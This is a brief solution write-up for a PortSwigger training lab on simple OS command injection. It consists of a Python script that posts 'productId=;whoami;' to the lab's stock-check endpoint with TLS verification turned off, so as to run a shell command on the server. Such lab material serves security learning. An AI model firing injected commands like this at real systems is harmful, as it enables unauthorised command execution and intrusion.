# Lab: OS command injection, simple case

link to lab: https://portswigger.net/web-security/os-command-injection/lab-simple

## Solution
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

data = 'productId=;whoami;&storeId=echo 1'

response = requests.post(
    'https://0a02004304ead3b0c00e6301000100a4.web-security-academy.net/product/stock',
    data=data,
    verify=False,
)

print(response.text)
```